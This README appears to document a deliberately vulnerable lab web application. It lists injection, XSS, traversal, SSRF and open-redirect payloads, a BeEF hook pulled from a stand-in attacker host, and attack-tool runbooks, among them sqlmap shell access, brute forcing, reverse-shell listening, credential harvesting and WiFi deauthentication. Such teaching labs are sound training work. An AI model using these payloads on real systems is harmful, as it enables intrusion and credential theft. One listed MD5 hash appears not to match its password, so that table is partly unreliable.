# Custom Vulnerable Web Application

A deliberately vulnerable web application for security tool demonstrations.

## ⚠️ WARNING

This application contains INTENTIONAL security vulnerabilities.
- NEVER deploy on production servers
- ONLY run in isolated lab environments
- NEVER store real user data
- FOR EDUCATIONAL PURPOSES ONLY

## Quick Start

```bash
cd /home/demonwarrior/Demonstration/vulnerable-webapp
docker compose up -d
```

Then access the application at `http://localhost:5000`

## Default Credentials

| Username | Password | Role |
|----------|----------|------|
| admin | admin | admin |
| user | password | user |
| test | test123 | user |
| sqltest | sql123 | user |

## Vulnerability Map

### 1. SQL Injection (SQLmap)
- **Login form**: `/login` - Authentication bypass
- **Search**: `/messages?sender=' OR '1'='1`
- **Direct query**: `/messages?sender=' UNION SELECT * FROM user--`

### 2. Cross-Site Scripting (XSS)
- **Reflected XSS**: `/search?q=<script>alert('XSS')</script>`
- **Stored XSS**: Post content on `/posts`
- **DOM XSS**: User bio on `/profile`

### 3. Command Injection
- **Ping**: `/ping?host=127.0.0.1; cat /etc/passwd`
- **DNS**: `/dns?domain=127.0.0.1; id`

### 4. Broken Authentication
- **Weak passwords**: admin/admin, user/password
- **MD5 hashing**: Password hashes easily crackable
- **Session fixation**: Predictable session tokens

### 5. IDOR (Insecure Direct Object Reference)
- **User profiles**: `/profile?id=1`, `/profile?id=2`, etc.
- **API endpoints**: `/api/users/1`, `/api/users/2`

### 6. File Upload Vulnerabilities
- **Weak validation**: Upload `shell.php.jpg`
- **Path traversal**: Upload to `../uploads/`

### 7. Security Misconfiguration
- **Debug mode**: `DEBUG=True` in production
- **Verbose errors**: Stack traces exposed
- **Directory listing**: `/uploads/`

### 8. Sensitive Data Exposure
- **API keys**: Exposed in `/api/config`
- **Password hashes**: `/api/users` returns hashes
- **Database URI**: Exposed in debug endpoint

### 9. SSRF (Server-Side Request Forgery)
- **URL fetch**: `/fetch?url=http://169.254.169.254/latest/meta-data/`
- **Internal scan**: `/fetch?url=http://localhost:3306`

### 10. Open Redirect
- `/redirect?url=https://evil.com`
- `/redirect?url=javascript:alert(1)`

### 11. Insecure Deserialization
- **Pickle**: `/load` endpoint accepts base64 pickled objects

### 12. File Inclusion
- **Path traversal**: `/page=../../etc/passwd`
- **Local file inclusion**: `/page=../../etc/shadow`

### 13. Header Injection
- `/header?value=<script>alert(1)</script>`

## Tool Demonstrations

### Nmap
```bash
# Service detection
nmap -sV -sC localhost

# Aggressive scan
nmap -A -T4 localhost

# All ports
nmap -p- localhost

# Vulnerability scripts
nmap --script=vuln localhost
```

### Metasploit Framework
```bash
msfconsole

# vsftpd 2.3.4 backdoor
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS localhost
set RPORT 21
run

# SSH brute force
use auxiliary/scanner/ssh/ssh_login
set RHOSTS localhost
set RPORT 2222
set USERNAME sshuser
set PASSWORD sshpass123
run
```

### Burp Suite
1. Configure browser proxy: `127.0.0.1:8080`
2. Intercept requests to `http://localhost:5000`
3. Test for:
   - SQL injection in login form
   - XSS in search
   - IDOR in profile page
   - Command injection in tools

### Wireshark
1. Capture traffic on Docker interface
2. Filter: `http` or `tcp.port == 5000`
3. Observe:
   - Plaintext credentials in POST requests
   - Session cookies
   - SQL injection payloads

### Nikto
```bash
nikto -h http://localhost:5000
```

### Gobuster
```bash
# Directory enumeration
gobuster dir -u http://localhost:5000 -w /usr/share/wordlists/dirb/common.txt

# With extensions
gobuster dir -u http://localhost:5000 -w /usr/share/wordlists/dirb/common.txt -x php,html,txt

# Subdomain enumeration (if applicable)
gobuster dns -u vulnapp.local -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1mil-5000.txt
```

### SQLmap
```bash
# Basic SQL injection
sqlmap -u "http://localhost:5000/messages?sender=admin" --dbs

# Login bypass
sqlmap -u "http://localhost:5000/login" --data="username=admin&password=test" --dbs

# Extract user table
sqlmap -u "http://localhost:5000/messages?sender=admin" -T user --dump

# Get shell
sqlmap -u "http://localhost:5000/messages?sender=admin" --os-shell
```

### John the Ripper
```bash
# Extract password hashes
mysql -h localhost -u vulnuser -pvulnpass vulnapp -e "SELECT username, password FROM user;" > hashes.txt

# Or use SQLmap to dump
sqlmap -u "http://localhost:5000/messages?sender=admin" -T user --dump --dump-file=users.csv

# Crack MD5 hashes
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Show cracked passwords
john --show hashes.txt
```

### Hashcat
```bash
# Crack MD5 hashes
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt

# Crack with rules
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Show results
hashcat -m 0 hashes.txt --show
```

### Hydra
```bash
# SSH brute force
hydra -l sshuser -P /usr/share/wordlists/rockyou.txt ssh://localhost:2222

# FTP brute force
hydra -l ftpuser -P /usr/share/wordlists/rockyou.txt ftp://localhost

# Login form brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt localhost http-post-form "/login:username=^USER^&password=^PASS^:Login failed"
```

### Netcat
```bash
# Banner grabbing
nc localhost 21
nc localhost 2222
nc localhost 5000

# Connect and interact
nc -v localhost 21

# Listen for reverse shell
nc -lvnp 4444
```

### Responder
```bash
# Start Responder (on local network)
sudo responder -I eth0 -wrf

# Poison LLMNR/NBT-NS
# Capture NTLM hashes from Windows machines
```

### BeEF (Browser Exploitation Framework)
1. Start BeEF: `./beef`
2. Hook a browser by including:
   ```html
   <script src="http://YOUR_IP:3000/hook.js"></script>
   ```
3. Use stored XSS on `/posts` to inject BeEF hook
4. Access BeEF console at `http://YOUR_IP:3000/ui/panel`

### SET (Social-Engineer Toolkit)
```bash
setoolkit

# Select: 1) Social-Engineering Attacks
# Select: 2) Website Attack Vectors
# Select: 3) Credential Harvester Attack
# Select: 2) Site Cloner
# Enter your IP and the URL to clone
```

### Aircrack-ng (Requires WiFi Adapter)
```bash
# Monitor mode
airmon-ng start wlan0

# Capture handshake
airodump-ng wlan0mon
airodump-ng --bssid XX:XX:XX:XX:XX:XX -c 6 -w capture wlan0mon

# Deauth to capture handshake
aireplay-ng --deauth 10 -a XX:XX:XX:XX:XX:XX wlan0mon

# Crack with wordlist
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap
```

## Services Running

| Service | Port | Description |
|---------|------|-------------|
| Flask App | 5000 | Main vulnerable web application |
| MySQL | 3306 | Database for SQLmap testing |
| FTP | 21 | VSFTPD for FTP testing |
| SSH | 2222 | OpenSSH for brute force testing |
| WordPress | 8080 | Vulnerable WordPress instance |

## Network Configuration

The application runs on an isolated Docker network. For external tool access:

1. **From host machine**: Tools can access services via mapped ports
2. **Between containers**: Use container names (e.g., `mysql`, `ftp`)
3. **For wireless testing**: You'll need to attach Aircrack-ng to the Docker network

## Cleanup

```bash
cd /home/demonwarrior/Demonstration/vulnerable-webapp
docker compose down -v
```

## Password Hashes (For John/Hashcat)

The application uses MD5 hashing. Default password hashes:

| Username | Password | MD5 Hash |
|----------|----------|----------|
| admin | admin | 21232f297a57a5a743894a0e4a801fc3 |
| user | password | 5f4dcc3b5aa765d61d8327deb882cf99 |
| test | test123 | cc03e747566b8a4504e682b2bc4e5023 |
| sqltest | sql123 | d8578edf8458ce06fbc5bb76a58c5ca4 |

## Additional Notes

- The application intentionally uses weak security practices
- All vulnerabilities are documented and intentional
- Use this only in isolated lab environments
- Never test against systems you don't own or have permission to test
